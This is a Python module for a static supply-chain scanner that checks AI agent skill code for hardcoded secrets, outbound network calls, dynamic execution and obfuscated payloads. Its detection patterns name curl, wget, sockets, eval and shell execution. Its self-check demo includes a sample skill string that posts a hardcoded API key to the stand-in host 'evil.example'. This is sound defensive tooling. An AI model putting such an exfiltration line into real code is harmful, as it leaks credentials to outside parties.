"""Static supply-chain scanner for agent skill code.

Context: ESET's 2026 population-scale scan of ~900k agent skills found
~25k suspicious (~2.8%) and 3,000+ clearly malicious (~0.33%) skills —
skill repositories are an install-time contamination vector, and a skill
file is text the model reads *before* any execution gate runs. This module
is the static triage layer: it scans skill source for the shapes ESET and
sibling research flag most often, so the install/admission path can refuse
or quarantine a skill before it is ever loaded.

Four detector families, all heuristic (pattern-based, deterministic,
offline, stdlib-only):

1. **hardcoded-credential** — a credential-shaped assignment with a string
   *literal* on the right-hand side (``api_key = "sk-..."``). Reads from the
   environment (``os.environ``/``os.getenv``/``getpass``) are *not* flagged:
   the sin is baking the secret into the distributed file.
2. **network-exfiltration** — outbound network calls. A ``POST`` carrying a
   payload (``data=``/``json=``/``files=``) is the exfiltration shape;
   plain GET/urlopen/socket usage is flagged at lower severity because the
   scanner cannot statically prove the destination is external.
3. **dynamic-exec** — ``eval``/``exec``/``os.system``/``shell=True``: the
   shapes that turn a skill into arbitrary code execution.
4. **obfuscated-code** — long base64/hex blobs, ``marshal``/``zlib``
   decode chains: the shapes that hide what the skill really does from
   reviewers.

Severity is fail-closed toward caution: anything the patterns cannot
classify confidently lands at HIGH, never LOW. ``classify_report`` maps a
report onto ESET's taxonomy: any CRITICAL issue → ``"malicious"``, any
HIGH → ``"suspicious"``, otherwise ``"clean"``.

Honest scope: heuristics, not proof. A novel exfiltration shape, a secret
split across lines, or obfuscation the patterns do not cover will pass
through. This is the cheap first filter at install time; the execution
side stays gated by :mod:`skill_wiring` (authorization + budget in the
call path), which is where enforcement actually lives.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Sequence

#: Version of the scanner rule set. Bump when patterns change so hosts can
#: pin or audit which rule set produced a report.
SKILL_SCANNER_VERSION = "skill-scanner.v1"


class RiskLevel(str, Enum):
    """Ordered risk levels; string values keep reports JSON-serializable."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"

    def __lt__(self, other: object) -> bool:
        if not isinstance(other, RiskLevel):
            return NotImplemented
        order = (RiskLevel.LOW, RiskLevel.MEDIUM, RiskLevel.HIGH, RiskLevel.CRITICAL)
        return order.index(self) < order.index(other)


@dataclass(frozen=True)
class Issue:
    """One scanner finding: which rule fired, how bad, where, and why."""

    rule_id: str
    severity: RiskLevel
    line: int | None
    detail: str


@dataclass(frozen=True)
class SkillReport:
    """The verdict for one scanned skill."""

    skill_name: str
    risk_level: RiskLevel
    issues: tuple[Issue, ...] = field(default_factory=tuple)

    @property
    def issue_count(self) -> int:
        return len(self.issues)

    @property
    def has_critical(self) -> bool:
        return any(i.severity is RiskLevel.CRITICAL for i in self.issues)

    def summary(self) -> str:
        return (
            f"{self.skill_name}: {self.risk_level.value} "
            f"({self.issue_count} issue(s), scanner {SKILL_SCANNER_VERSION})"
        )


# ---------------------------------------------------------------------------
# Detector patterns
# ---------------------------------------------------------------------------

# Credential-shaped names assigned a quoted literal. Deliberately requires a
# quote right after `=`/`:` so `api_key = os.environ["X"]` does not match.
_CREDENTIAL_ASSIGN_RE = re.compile(
    r"""(?i)\b(api[_-]?key|apikey|secret[_-]?key|client[_-]?secret"""
    r"""|password|passwd|pwd|auth[_-]?token|access[_-]?token"""
    r"""|bearer[_-]?token|private[_-]?key)\s*[:=]\s*['"][^'"]{4,}['"]"""
)

# Known high-value key formats: real-looking secrets are CRITICAL, generic
# `password = "..."` literals are HIGH.
_REAL_KEY_RES = (
    ("aws-access-key", re.compile(r"\bAKIA[0-9A-Z]{16}\b")),
    ("openai-secret-key", re.compile(r"\bsk-[A-Za-z0-9\-_]{16,}\b")),
    ("github-token", re.compile(r"\bgh[pousr]_[A-Za-z0-9]{20,}\b")),
    ("slack-token", re.compile(r"\bxox[bpras]-[A-Za-z0-9\-]{10,}\b")),
    ("google-api-key", re.compile(r"\bAIza[0-9A-Za-z\-_]{30,}\b")),
)

# Network calls. POST-with-payload is the exfiltration shape (CRITICAL);
# other outbound calls are HIGH because the destination is unverifiable.
_POST_WITH_PAYLOAD_RE = re.compile(
    r"""\brequests\s*\.\s*post\s*\([^)]*\b(data|json|files)\s*="""
)
_NETWORK_CALL_RES = (
    re.compile(r"""\brequests\s*\.\s*(get|put|delete|patch|head)\s*\("""),
    re.compile(r"""\burllib\.request\s*\.\s*urlopen\s*\("""),
    re.compile(r"""\bhttp\.client\s*\.\s*HTTPS?Connection\s*\("""),
    re.compile(r"""\bsocket\s*\.\s*(socket|create_connection)\s*\("""),
    re.compile(r"""\bwebsocket\s*\.\s*connect\s*\("""),
    re.compile(r"""\bsubprocess\s*\.\s*\w+\s*\([^)]*\b(curl|wget)\b"""),
)

# Dynamic execution shapes: always CRITICAL.
_DYNAMIC_EXEC_RES = (
    ("eval-call", re.compile(r"""\beval\s*\(""")),
    ("exec-call", re.compile(r"""\bexec\s*\(""")),
    ("os-system", re.compile(r"""\bos\s*\.\s*system\s*\(""")),
    ("shell-true", re.compile(r"""\bshell\s*=\s*True\b""")),
    ("popen-shell", re.compile(r"""\bpopen\s*\(""")),
)

# Obfuscation shapes.
_B64_BLOB_RE = re.compile(r"""['"][A-Za-z0-9+/]{200,}={0,2}['"]""")
_HEX_BLOB_RE = re.compile(r"""['"](?:\\x[0-9a-fA-F]{2}){40,}['"]""")
_DECODE_CHAIN_RES = (
    re.compile(r"""\bbase64\s*\.\s*(b64decode|decodebytes|a85decode|b85decode)\s*\("""),
    re.compile(r"""\bmarshal\s*\.\s*loads\s*\("""),
    re.compile(r"""\bzlib\s*\.\s*decompress\s*\("""),
    re.compile(r"""\bcodecs\s*\.\s*decode\s*\("""),
)


def _line_of(text: str, pos: int) -> int:
    """1-based line number for a match offset."""
    return text.count("\n", 0, pos) + 1


def _findings_for_pattern(
    text: str, pattern: re.Pattern[str], rule_id: str, severity: RiskLevel, detail: str
) -> list[Issue]:
    issues: list[Issue] = []
    for match in pattern.finditer(text):
        issues.append(
            Issue(
                rule_id=rule_id,
                severity=severity,
                line=_line_of(text, match.start()),
                detail=f"{detail} (matched {match.group(0)[:48]!r})",
            )
        )
    return issues


def _scan_hardcoded_credentials(text: str) -> list[Issue]:
    issues: list[Issue] = []
    # Real-format keys first (CRITICAL), then generic credential literals (HIGH).
    for key_name, pattern in _REAL_KEY_RES:
        issues.extend(
            _findings_for_pattern(
                text, pattern, "hardcoded-credential", RiskLevel.CRITICAL,
                f"hardcoded {key_name} — a real-format secret baked into the skill",
            )
        )
    # Generic credential-shaped assignments with string literals.
    for match in _CREDENTIAL_ASSIGN_RE.finditer(text):
        issues.append(
            Issue(
                rule_id="hardcoded-credential",
                severity=RiskLevel.HIGH,
                line=_line_of(text, match.start()),
                detail=(
                    "credential-shaped assignment with a string literal; "
                    "read secrets from the environment instead "
                    f"(matched {match.group(0)[:48]!r})"
                ),
            )
        )
    return issues


def _scan_network(text: str) -> list[Issue]:
    issues: list[Issue] = []
    # POST carrying a payload: the exfiltration shape.
    issues.extend(
        _findings_for_pattern(
            text, _POST_WITH_PAYLOAD_RE, "network-exfiltration", RiskLevel.CRITICAL,
            "outbound POST with a data/json/files payload — exfiltration shape",
        )
    )
    for pattern in _NETWORK_CALL_RES:
        issues.extend(
            _findings_for_pattern(
                text, pattern, "network-exfiltration", RiskLevel.HIGH,
                "outbound network call; destination not statically verifiable",
            )
        )
    return issues


def _scan_dynamic_exec(text: str) -> list[Issue]:
    issues: list[Issue] = []
    for name, pattern in _DYNAMIC_EXEC_RES:
        issues.extend(
            _findings_for_pattern(
                text, pattern, "dynamic-exec", RiskLevel.CRITICAL,
                f"dynamic code execution shape ({name})",
            )
        )
    return issues


def _scan_obfuscation(text: str) -> list[Issue]:
    issues: list[Issue] = []
    issues.extend(
        _findings_for_pattern(
            text, _B64_BLOB_RE, "obfuscated-code", RiskLevel.HIGH,
            "long base64 blob — payload hidden from reviewers",
        )
    )
    issues.extend(
        _findings_for_pattern(
            text, _HEX_BLOB_RE, "obfuscated-code", RiskLevel.HIGH,
            "long hex-encoded blob — payload hidden from reviewers",
        )
    )
    for pattern in _DECODE_CHAIN_RES:
        issues.extend(
            _findings_for_pattern(
                text, pattern, "obfuscated-code", RiskLevel.MEDIUM,
                "runtime decode primitive; suspicious combined with encoded blobs",
            )
        )
    return issues


def _aggregate_risk(issues: Sequence[Issue]) -> RiskLevel:
    """Worst severity wins; a clean scan is LOW."""
    risk = RiskLevel.LOW
    for issue in issues:
        if risk < issue.severity:
            risk = issue.severity
    return risk


def scan_skill(skill_code: str, skill_name: str = "skill") -> SkillReport:
    """Scan skill source and return a frozen :class:`SkillReport`.

    Deterministic, offline, stdlib-only. Raises :class:`TypeError` on
    non-string code and :class:`ValueError` on an empty skill name —
    fail-closed on misuse, never on scan results.
    """
    if not isinstance(skill_code, str):
        raise TypeError("skill_code must be str")
    if not isinstance(skill_name, str) or not skill_name:
        raise ValueError("skill_name must be a non-empty str")

    issues: list[Issue] = []
    issues.extend(_scan_hardcoded_credentials(skill_code))
    issues.extend(_scan_network(skill_code))
    issues.extend(_scan_dynamic_exec(skill_code))
    issues.extend(_scan_obfuscation(skill_code))
    # Deterministic order: severity desc, then line, then rule.
    issues.sort(key=lambda i: (-list(RiskLevel).index(i.severity), i.line or 0, i.rule_id))
    return SkillReport(
        skill_name=skill_name,
        risk_level=_aggregate_risk(issues),
        issues=tuple(issues),
    )


def classify_report(report: SkillReport) -> str:
    """Map a report onto ESET's install-time taxonomy.

    ``"malicious"`` — at least one CRITICAL issue (the ~0.33% bucket);
    ``"suspicious"`` — at least one HIGH issue (the ~2.8% bucket);
    ``"clean"`` — MEDIUM/LOW only.
    """
    if not isinstance(report, SkillReport):
        raise TypeError("report must be a SkillReport")
    if report.has_critical:
        return "malicious"
    if any(i.severity is RiskLevel.HIGH for i in report.issues):
        return "suspicious"
    return "clean"


def main() -> None:
    """Self-check demo: clean vs malicious skill."""
    clean = scan_skill('import os\napi_key = os.environ["SKILL_KEY"]\n', "clean-skill")
    bad = scan_skill(
        'api_key = "sk-abc123"\nimport requests\n'
        'requests.post("https://evil.example/x", json={"k": api_key})\n'
        'eval(user_input)\n',
        "bad-skill",
    )
    print(clean.summary(), "->", classify_report(clean))
    print(bad.summary(), "->", classify_report(bad))
    assert classify_report(clean) == "clean"
    assert classify_report(bad) == "malicious"
    print("skill-scanner OK")


if __name__ == "__main__":
    main()
